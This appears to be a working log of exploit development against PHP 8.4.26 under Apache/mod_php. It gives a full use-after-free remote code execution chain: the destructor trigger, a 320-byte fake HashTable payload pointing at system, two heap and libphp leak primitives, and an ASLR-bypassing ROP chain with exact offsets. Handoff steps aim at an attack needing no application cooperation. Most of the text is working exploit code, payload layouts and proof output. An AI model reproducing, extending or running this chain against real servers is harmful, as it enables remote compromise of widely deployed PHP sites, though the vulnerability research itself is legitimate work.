# PHP 8.4.26 Session Vulnerability Reproduction Notes (Apache/mod_php, no-ASLR)

Date: 2026-10-21
Working directory: `/Users/my/php2shell`
Remote lab host: `debian@172.16.1.112` (Debian 12, amd64, kernel 6.1.0-48)

---

## 1. Summary

### 1.1 Achieved

- Real command execution was achieved on unmodified PHP 8.4.26 source (built from the official tarball) with Apache 2.4.68 prefork + mod_php and **ASLR disabled**.
- Command: `system("id>/tmp/x")`. File contents:

~~~text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

- Five independent requests succeeded consecutively; prefork restarted the worker after each crash.
- GDB hit:

~~~text
SYSTEM rdi=0x7ffff5e045a0 cmd=id>/tmp/x
#0  __libc_system (line=0x7ffff5e045a0 "id>/tmp/x")
#1  zend_hash_destroy (ht=0x7ffff5e04580)
#2  zend_array_destroy (ht=0x7ffff5e04580)
#3  zend_hash_clean (ht=0x7ffff5e031c0)
#4  zif_session_unset
...
~~~

- ASLR comparison: a normal `apache2ctl start` (personality=0) failed; `setarch x86_64 -R apache2ctl start` (personality=0x40000) succeeded.

### 1.2 Trigger Used on This Track

The exploit page `tools/d.php` is a test page with a `__destruct` method:

~~~php
session_start();
$_SESSION["x"] = new X($fp, $payload);   // X::__destruct writes to $_SESSION
for ($i = 0; $i < 7; $i++) $_SESSION["k".$i] = "v";
session_unset();                         // key step: zend_hash_clean on the array still referenced by $_SESSION
~~~

`session_unset()` calls `zend_hash_clean($_SESSION array)`. When cleanup reaches object X, it calls `X::__destruct`. The destructor writes `$_SESSION["pwn"]`, causing `zend_hash_do_resize()` on the same HashTable and freeing its old `arData`. The outer `zend_hash_clean` continues using the cached `p/end` from before the loop, resulting in a heap-use-after-free. The destructor then uses `stream_bucket_new()` to allocate a fully controlled 320-byte raw buffer, reclaiming the freed `arData` allocation. Cleanup continues to treat that block as Buckets and eventually reaches a fake HashTable whose `pDestructor = system`.

> **Scope:** This is an exploit for “Defect D” that requires the target script to call `session_unset()` and have a destructor that writes to `$_SESSION` (or an equivalent application gadget). It is not a public exploit chain using only `session.upload_progress` with no application cooperation. Progress on the upload_progress track is in section 5.

---

## 2. Lab Environment

### 2.1 PHP Build

~~~bash
mkdir -p ~/php-lab && cd ~/php-lab
curl -sL -o php-8.4.26.tar.gz https://www.php.net/distributions/php-8.4.26.tar.gz
tar xzf php-8.4.26.tar.gz && cd php-8.4.26
./configure --prefix=/opt/php8426 --with-apxs2=/usr/bin/apxs2 \
  --enable-mbstring --with-openssl --with-zlib --with-curl --with-sqlite3 \
  --with-zip --disable-opcache --enable-ctype --enable-filter --enable-json --enable-session
make -j16 && sudo make install
~~~

Artifacts: `/usr/lib/apache2/modules/libphp.so` and `/opt/php8426/bin/php` (`PHP 8.4.26 (cli) (NTS)`).

### 2.2 Apache

- `mpm_prefork`, one worker: `StartServers 1 / MinSpareServers 1 / MaxSpareServers 1 / ServerLimit 1 / MaxRequestWorkers 1 / MaxConnectionsPerChild 0`.
- `KeepAlive Off`, listening on `127.0.0.1:8088`, DocumentRoot `/home/debian/php-lab/www`.
- Key PHP settings in `/etc/apache2/conf-available/php8426.conf`:

~~~apache
php_admin_value memory_limit 8M
php_admin_value post_max_size 64M
php_admin_value upload_max_filesize 64M
php_admin_value session.save_path /tmp
php_admin_value session.use_strict_mode 0
php_admin_value session.use_cookies 0
php_admin_value session.upload_progress.enabled On
php_admin_value session.upload_progress.cleanup On
~~~

> `memory_limit 8M` makes OOM reliable on the upload_progress track; the RCE track does not depend on this value.

### 2.3 Disable ASLR

~~~bash
sudo apache2ctl -k stop
sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
# Verify
sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
# 00040000
~~~

With ASLR disabled, fresh workers under the same configuration use stable addresses (see the address table in section 4).

---

## 3. Defect D: Reentry During Session Tree Cleanup → arData UAF

### 3.1 Call Chain

~~~text
zif_session_unset()                     ext/session/session.c
  zend_hash_clean(ht = $_SESSION array)  Zend/zend_hash.c
    ht->pDestructor(&p->val)             // processes object X and calls X::__destruct
      X::__destruct()
        $_SESSION["pwn"] = ...           // writes to the same array
          zend_hash_do_resize(ht)        // table is full; resize
            pemalloc(new arData)
            memcpy(new arData, old arData, nNumUsed)
            pefree(old arData)           // ★ old arData is freed
        stream_bucket_new(fp, payload320) // ★ 320-byte raw buffer reclaims old arData
      // Return to zend_hash_clean loop:
      p++ continues through reclaimed old arData // ★ UAF; reads attacker-controlled Bucket
        ht->pDestructor(&p->val)          // ZVAL_PTR_DTOR
          zend_array_destroy(fake_ht)
            zend_hash_destroy(fake_ht)
              fake_ht->pDestructor(&fake_val) // = system
                system("id>/tmp/x")      // ★ RCE
~~~

Relevant source:

- `session_unset()`: `ext/session/session.c` (`PHP_FUNCTION(session_unset)`, around lines 2756–2773 in 8.4.26).
- `zend_hash_clean()`: around lines 1885–1932 in `Zend/zend_hash.c`; the loop keeps local `Bucket *p, *end` and continues with `++p` after `pDestructor` returns.
- `zend_hash_do_resize()`: `Zend/zend_hash.c:1327`; calls `pefree(old_data, ...)` after resize.
- `zend_array_destroy()`: `Zend/zend_hash.c:1815`; `zend_hash_destroy()`: `Zend/zend_hash.c:1734`.
- `stream_bucket_new()`: `ext/standard/user_filters.c:472`; allocates with `pemalloc(buffer_len)` then copies fully controlled content, while the bucket resource keeps it alive.
- Dtor-before-store window in `zend_hash_update_ind`: `_zend_hash_add_or_update_i()` in `Zend/zend_hash.c`, around line 872.

### 3.2 Measured Addresses (This Build, Configuration, and no-ASLR Worker)

| Object | Address |
|---|---|
| Session HashTable A | `0x7ffff5e031c0` |
| A's arData (8 buckets) | `0x7ffff5e04540` |
| Start S of the 320-byte allocation containing arData | `0x7ffff5e04500` |
| Fake zval (clean's bucket 1) | `S+0x60 = 0x7ffff5e04560` |
| Fake HashTable | `S+0x80 = 0x7ffff5e04580` |
| Fake Bucket / command string | `S+0xa0 = 0x7ffff5e045a0` |
| libc `system` | `0x7ffff7d13490` |
| `ps_globals` | `0x7ffff56c2880` |
| `executor_globals` | `0x7ffff56d8380` |

A's measured `nTableSize=8` and `nTableMask=0xfffffff0` (0x40-byte hash area), so `arData = S+0x40`. This matches `g17_clean_mask.log`.

### 3.3 320-Byte Payload Layout

The payload lands at `S = 0x7ffff5e04500` as the raw buffer from `stream_bucket_new()`. Bucket 0 in the clean loop is object X. After its destructor runs, clean still reads its key at `S+0x58`, which must be 0. Bucket 1 is at `arData+0x20 = S+0x60`.

| Offset | Contents | Notes |
|---|---|---|
| `0x00–0x3f` | 0 | Hash prefix area not read by clean |
| `0x40–0x5f` | 0 | Bucket 0 val/h; `0x58` is bucket 0's key and must be 0 |
| `0x60` | `S+0x80` (8 bytes) | Bucket 1 fake zval.value → fake HashTable |
| `0x68` | `0x307` (8 bytes) | zval type_info = IS_ARRAY_EX |
| `0x70` | 0 | Bucket 1 h |
| `0x78` | 0 | Bucket 1 key |
| `0x80` | `01 00 00 00 07 00 00 00` | Fake HashTable gc: refcount=1, type=IS_ARRAY |
| `0x88` | `10 00 00 00 f8 ff ff ff` | flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8 |
| `0x90` | `S+0xa0` | fake HashTable.arData |
| `0x98` | `01 00 00 00 01 00 00 00` | nNumUsed=1, nNumOfElements=1 |
| `0xa0` | `"id>/tmp/"` | fake Bucket.val.value (first 8 command bytes) |
| `0xa8` | `0x78` (8 bytes) | fake zval type_info: low byte is 'x', followed by 0; command ends with x\0 |
| `0xb0` | system address | fake HashTable.pDestructor |

`zend_hash_destroy(fake_ht)` takes the `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES` branch and calls `pDestructor(&p->val)`, which is `system(S+0xa0)`; the command string is `id>/tmp/x`.

> The fake HashTable's `HT_GET_DATA_ADDR` is `arData - 32 = S+0x80` (not the allocation start), so `pefree()` may abort or corrupt the heap after system returns. The command has already run and the proof file has been written. For a clean return, place the fake HashTable at S and set arData to another controlled allocation, or use two `stream_bucket_new` calls to provide separate HT and data buffers (see section 7).

### 3.4 Reproduction Evidence

- Five out of five remote runs succeeded:

~~~text
RUN 1 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
RUN 5 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

- ASLR comparison:

~~~text
ASLR_ON: personality=00000000
ASLR_ON_FAIL_AS_EXPECTED
ASLR_OFF: personality=00040000
ASLR_OFF_OK: uid=33(www-data) ...
~~~

- Full GDB evidence: `logs/g16_system_trace.log`.
- Old arData contents and UAF landing point: `logs/g15_uaf_memory.log`.
- Real array mask and allocation start: `logs/g17_clean_mask.log`.

---

## 4. Cross-Request `session.upload_progress` Track (Independent Reproduction Progress)

This is the main path from the supplied intelligence. This track has reproduced **cross-request residue and repeatable crashes**, but the fake HashTable chain has not yet been connected. The mechanism, addresses, and harness are confirmed.

### 4.1 Request A: OOM Bailout Leaves Cross-Request State

Request A (`tools/sup_poc.py a`):

- `Content-Type: multipart/form-data`, with fields in this order:
  1. `PHPSESSID=attacksessionid0001`
  2. `PHP_SESSION_UPLOAD_PROGRESS=pwn`
  3. File field (triggers `MULTIPART_EVENT_FILE_START` and session initialization)
  4. About 12 MB of ordinary field data (triggers memory_limit OOM after session initialization)
- Observed: 200 response + `Allowed memory size of 8388608 bytes exhausted`; session file `/tmp/sess_attacksessionid0001` (321 bytes) was written.
- GDB trace showed:
  - Entered `php_request_startup`.
  - At `php_session_track_init`, `PS(http_session_vars)=NULL` (first initialization in this request).
  - After OOM, `php_request_shutdown` / `zend_deactivate` / `shutdown_memory_manager` were **not** reached.
- After the request, `ps_globals` still contains:

~~~text
ps_globals.http_session_vars: type=0x10a (IS_REFERENCE), ptr=0x7ffff5e02320
  0x7ffff5e02320: refcount=2, val=0x7ffff5e03230 (IS_ARRAY)
ps_globals.id: 0x7ffff5e600c0
ps_globals.session_status: active(1)
~~~

`refcount=2` corresponds to the first reference from `ZVAL_NEW_REF` plus a `Z_ADDREF_P` reserved for the symbol table. This means `_SESSION` remains in the symbol table and the request heap did not go through normal shutdown.

### 4.2 Request B: END Cleanup Reaches the State Without FILE_START RINIT

Request B (`tools/sup_poc.py b`) sends only:

- `PHPSESSID`
- `PHP_SESSION_UPLOAD_PROGRESS`
- **No file field**

Therefore it does not trigger `php_rinit_session(0)` through `MULTIPART_EVENT_FILE_START`. At `MULTIPART_EVENT_END`:

~~~text
php_session_rfc1867_callback(MULTIPART_EVENT_END)
  php_session_rfc1867_cleanup()
    php_session_initialize()
      php_session_track_init()
~~~

The first operation in `php_session_track_init()` is `zend_delete_global_variable("_SESSION")`. The symbol table's `_SESSION` is **IS_INDIRECT**, pointing to `PS.http_session_vars`:

- `zend_hash_del_ind()` follows the indirect, sets the target zval to UNDEF, and calls its dtor; the bucket itself remains.
- `zend_hash_update_ind()` then finds that indirect bucket again, follows it to `PS.http_session_vars`, and calls the data's `pDestructor` **before the store** (the dtor-before-store window in `_zend_hash_add_or_update_i`).

Measured in GDB:

~~~text
TRACK psvars=0x7ffff5e02320 ti=10a
PS_DTOR type=10a ptr=0x7ffff5e02320     # old reference rc 2 -> 1
PS_DTOR type=10a ptr=0x7ffff5e01240     # update_ind calls dtor on the new reference
TRACK psvars=0x7ffff5e01240 ti=0
REF_DESTROY 0x7ffff5e01240 rc=0 val=0x7ffff5e02150 ti=307
ARR_DESTROY arr=0x7ffff5e02150 flags=8 numused=0 ...
...
SIGSEGV in _IO_new_fclose(fp=0xffffffff)   # php_handler cleanup; script file handle was corrupted
~~~

B also emits:

~~~text
PHP Request Startup: Session ID is too long or contains illegal characters
PHP Request Startup: Failed to read session data: files (path: /tmp)
~~~

This happens because `PS.id` still points to a zend_string freed with request A, and B's END cleanup uses it directly instead of `progress->sid`.

### 4.3 What Is Still Missing

- The cross-request path is available: dangling `PS.http_session_vars` reference, dangling `PS.id` zend_string, symbol-table indirect bucket, dtor-before-store in `update_ind`, and repeatable SIGSEGV/SIGABRT.
- The controlled 320-byte arData reclaim + fake HashTable has not been connected to this path. Reasons:
  - Request B's END cleanup runs before script execution. Attacker-controlled multipart allocations happen first, but the array/reference addresses and free order created by `track_init` differ from Defect D.
  - B's first `track_init` changes the old reference count from 2 to 1 without destroying it. A second `session_start()` inside the script is needed to trigger `zend_delete_global_variable`/`REF_DESTROY`.
  - This path commonly ends with a corrupted stream/file handle (`fclose(0xffffffff)`), not a controlled `pDestructor`.
- Reusable pieces: 320-byte raw spray via `stream_bucket_new()`, fake zval/fake HashTable layout, system address, and stable addresses with ASLR disabled.

---

## 5. Relationship to the Previous Stage's Intelligence

The chain in the earlier screenshots was:

~~~text
Request A (upload_progress + OOM)
Request B (same worker, RFC1867 buffer reclaim)
zval_ptr_dtor → zend_array_destroy → pDestructor → zend_call_function → zif_system
~~~

This track independently reproduced the **same family of session internals defects** and completed:

- `session_unset → zend_hash_clean → object destructor writes to $_SESSION → resize frees arData → UAF`;
- Reclaiming the UAF block with a 320-byte raw spray from `stream_bucket_new`;
- The complete fake zval → fake HashTable → `pDestructor=system` RCE chain.

The difference is that this track uses `session_unset()` + `__destruct` as the trigger/reentry, while the earlier report claimed to forge a HashTable directly through pure upload-progress cross-request layout. The two approaches may be combined: reuse this track's fake HashTable payload in the upload_progress path, or use the earlier cross-request primitive to replace this track's application-level destructor.

---

## 6. Reproduction Commands (From Scratch)

### 6.1 Environment

See section 2. Confirm:

~~~bash
/opt/php8426/bin/php -v           # PHP 8.4.26
curl -sI http://127.0.0.1:8088/   # X-Powered-By: PHP/8.4.26
sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
# 00040000
~~~

### 6.2 Deploy the PoC

~~~bash
scp tools/d.php debian@172.16.1.112:/home/debian/php-lab/d.php
ssh debian@172.16.1.112
sudo cp /home/debian/php-lab/d.php /home/debian/php-lab/www/d.php
sudo chown www-data:www-data /home/debian/php-lab/www/d.php
sudo rm -f /tmp/x
curl -s --max-time 8 http://127.0.0.1:8088/d.php >/dev/null
cat /tmp/x
~~~

### 6.3 upload_progress A/B Harness

~~~bash
scp tools/sup_poc.py debian@172.16.1.112:/home/debian/php-lab/
ssh debian@172.16.1.112
cd ~/php-lab
python3 sup_poc.py a   # Request A: OOM, leaves cross-request state
python3 sup_poc.py b   # Request B: END cleanup; observe crash/warnings
~~~

> B in `sup_poc.py` omits the file field by default. This is the key to bypassing `php_rinit_session(0)`. Set `B_REF_HEX` / `B_HT_HEX` environment variables to append `ref` / `ht` fields to B for later heap-spray experiments.

---

## 7. Suggested Next Steps (Handoff)

1. **Connect the fake HashTable to the upload_progress track**
   - Put a 320-byte class allocation in request B's multipart fields/boundary and inspect which block is reclaimed near `php_session_track_init` during END cleanup.
   - Reuse this track's payload layout, but remeasure the A/arData/S addresses because B's allocation sequence differs.
2. **Make RCE return cleanly**
   - Place the fake HashTable at S, set `arData=S+0x40` and `mask=0xfffffff0` so `HT_GET_DATA_ADDR=S`. Use another controlled allocation for the data block to avoid a double free/interior free.
3. **ASLR bypass**
   - Earlier intelligence proposed leaking the heap base with mbstring. This track's `stream_bucket_new` layout and system offset can be reused. Leak heap base first, then calculate S/A; obtain libc base through another leak or a format-string primitive.
4. **PHP-FPM**
   - Defect D is a single-request primitive. It should also apply if an FPM application calls `session_unset()` and has a destructor that writes to `$_SESSION`. Cross-request PS residue does not apply to FPM because the worker is replaced after bailout, as previously confirmed.
5. **Version coverage**
   - These notes are based on 8.4.26. Earlier intelligence reports similar primitives on 5.4/5.6/7.4/8.5; each version needs its HashTable/GC layout and `stream_bucket_new` behavior measured again before publishing a 1-day report.

---

## 8. Key Files and Logs

| Path | Contents |
|---|---|
| `tools/d.php` | no-ASLR RCE PoC (hard-coded addresses + 320B payload) |
| `tools/sup_poc.py` | upload_progress A/B multipart harness |
| `logs/g16_system_trace.log` | Full backtrace for the GDB hit on `system("id>/tmp/x")` |
| `logs/g15_uaf_memory.log` | Old arData memory after reclaim by the 320B spray |
| `logs/g17_clean_mask.log` | Real session array `nTableMask=0xfffffff0` and allocation start |
| `src/php-8.4.26/` | Official source (for analysis) |

---

## 9. Notes and Risks

- The remote lab may have leftover `/tmp/x`, `/tmp/destruct_done`, or `/tmp/core.*` files; clear them with `sudo rm -f` before testing.
- This PoC depends on a specific PHP build/configuration/startup order. Re-measure gadget and S offsets after changing the build.
- The no-ASLR version (`tools/d.php`) hard-codes the system address. The ASLR version in section 10 calculates addresses dynamically from two leaks and does not hard-code the base.
- This track's RCE uses an application-level trigger (`session_unset` + destructor). Do not describe it externally as a “pure upload_progress exploit with no application cooperation.” The pure upload_progress RCE still needs the integration work in section 7.

---

## 10. ASLR Bypass (Solved)

Goal: complete the same Defect D RCE with normal ASLR enabled (`personality=0`), without using `/proc/self/maps` or a debugger.

### 10.1 Two Leak Primitives

#### Leak 1: Zend MM 2 MB Chunk Base (775 Bytes of Heap Pointers)

With `session.serialize_handler=php_serialize`, `session_encode()` → `php_var_serialize(&buf, Z_REFVAL(PS(http_session_vars)))` follows a path that **does not have** the array-copy protection GH-16590 added for the `php` serializer (still triggerable in 8.4.26):

~~~php
class C {
    function __serialize() {
        $_SESSION = [];                 // free the session array currently being serialized
        $leak = [0x41424344, 0x45464748];
        $GLOBALS['keepref'] =& $leak;   // zend_reference reclaims the freed 32B string block
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C;
$_SESSION['s'] = str_repeat('A', 7); // zend_string allocation = 24+8 = 32B
for ($i=0;$i<8;$i++) $_SESSION['k'.$i] = $i;
$s = session_encode();
~~~

The serializer continues walking the freed old session array. The old string zval points to a 32B block reclaimed by a zend_reference; the reference's `val.type_info=0x307` (IS_ARRAY) is interpreted as the zend_string length `len=775`, so `session_encode()` returns a 775-byte out-of-bounds read.

- The 775-byte payload contains several canonical heap pointers (for example, no-ASLR `0x7ffff5e023a0` and ASLR `0x7fd3e62013a0`).
- For any such pointer, `ptr & ~0x1fffff` yields the 2 MB-aligned Zend MM chunk base.
- This exactly matches the 2 MB-aligned anonymous `rw-p` mapping in `/proc/<pid>/maps` (ASLR example: `0x7fd3e6200000-0x7fd3e6400000`).
- Script: `tools/leak.php`.

#### Leak 2: libphp Base (Controlled-Length 32 KB OOB Read)

Again use `php_serialize` + `session_encode()`, but put a 4050-byte string S (for the 4096-byte bin) in the old session array. In `__serialize()`, after freeing the session, use `stream_bucket_new()` to allocate a 4096-byte raw buffer that reclaims S and write a fake `zend_string` header:

~~~text
offset 0: gc.refcount=1, gc.type_info=IS_STRING
offset 8: h=0
offset 16: len=32768
offset 24: data ("LEAKMARK", etc.)
~~~

The serializer treats S as a 32768-byte string and copies 32 KB starting at S+24, past the 4096-byte buffer into the adjacent heap. A libphp code pointer appears at fixed output offset `0x1fe8` (8168).

- Measured under ASLR: `anchor=0x7f17fe3b6309` → `libphp_base = anchor - 0x5b6309 = 0x7f17fde00000`, exactly matching the `libphp.so` r--p start in `/proc/<pid>/maps`.
- After restarting the master, the anchor changes (for example `0x7fd3e7fb6309` → base `0x7fd3e7a00000`), but the formula still holds.
- Script: `tools/leak_libc.php?mode=file_first`.

### 10.2 ASLR-Adaptive Defect D ROP

Full driver: `tools/aslr_run2.py`.

1. Request `/leak.php`, parse 775 bytes, and set `hb = mode(ptr & ~0x1fffff)`.
2. Request `/leak_libc.php?mode=file_first`, read the qword at payload offset `0x1fe8`, and calculate `lb = anchor - 0x5b6309`.
3. Calculate `S = hb + 0x3780`. This is the measured arData allocation-start offset for the `dyn_payload.php` request **after the two leak requests**, with ASLR disabled. Remeasure if the script or request order changes.
4. Generate a 320-byte payload (Python `struct.pack`, 640 hex characters) and send it to `/dyn_payload.php` using `?p=`. PHP calls `hex2bin` once, preserving the allocation pattern used during calibration.
5. Payload layout:
   - Fake `bucket1` zval: `value=S+0x80`, `type=0x307`.
   - Fake HashTable at `S+0x80`: `flags=HASH_FLAG_STATIC_KEYS(16)`, `nTableMask=0xfffffff8`, `arData=S+0xa0`, `nNumUsed=nNumOfElements=1`.
   - `pDestructor = lb + 0x21ef23` (libphp `leave; ret`).
   - When `zend_hash_destroy` calls `pDestructor(&p->val)`, `RBP = end = arData + nNumUsed*32 = S+0xc0`; `leave; ret` moves the stack to payload address `S+0xc0`.
   - ROP chain:
     ~~~text
     S+0xc0: 0
     S+0xc8: lb + 0x15e492  (pop rdi; ret)
     S+0xd0: S + 0x120      ("id>/tmp/x")
     S+0xd8: lb + 0x15d1a3  (pop rsi; ret)
     S+0xe0: S + 0x130      ("r")
     S+0xe8: lb + 0x15a029  (ret; alignment)
     S+0xf0: lb + 0x1504d0  (popen@plt)
     S+0xf8: lb + 0x155780  (exit@plt)
     ~~~
   - Uses only libphp addresses, no libc base; `popen` is resolved through libphp's PLT.
6. Command `id>/tmp/x` runs synchronously and writes the proof. Then `exit`/worker termination occurs.

### 10.3 Measured Results Under ASLR

Current master (`personality=0`):

~~~text
anchor 0x7f17fe3b6309 hb 0x7f17fc600000 lb 0x7f17fde00000 S 0x7f17fc603780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(3/3 consecutive runs)
~~~

After restarting a fresh Apache master (all bases randomized again):

~~~text
anchor 0x7fd3e7fb6309 hb 0x7fd3e6200000 lb 0x7fd3e7a00000 S 0x7fd3e6203780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(2/2 consecutive runs)
~~~

Under one Apache master, prefork workers inherit the same Zend MM chunk/libphp mappings, so hb/lb remain unchanged when a worker is recreated. They change only after a master restart, and the leaks adapt to the new values.

### 10.4 Limits and Notes

- Leak 1/2 require `session.serialize_handler=php_serialize` (the script can set `ini_set`, or the application can already use this serializer). The default `php` serializer has the GH-16590 fix and no longer leaks.
- The `libphp_base` anchor offset `0x5b6309`, gadget/PLT offsets, and `S_OFF=0x3780` are specific to this PHP 8.4.26 build and request shape. Recalibrate for a different build or script.
- This track still uses an application-level trigger (`session_unset` + destructor); the leak scripts are userland PHP in the same application. To make it “pure upload_progress with no application cooperation,” integrate the cross-request chain in section 7 with this ROP endpoint.
- The directory also contains a parallel agent's `/proc/self/maps` variant (`tools/d_aslr.php`, `tools/maps.php`, `tools/calibrate.py`, etc.), which depends on the application being able to read `/proc/self/maps`. The leak approach in this section does not rely on reading a file.
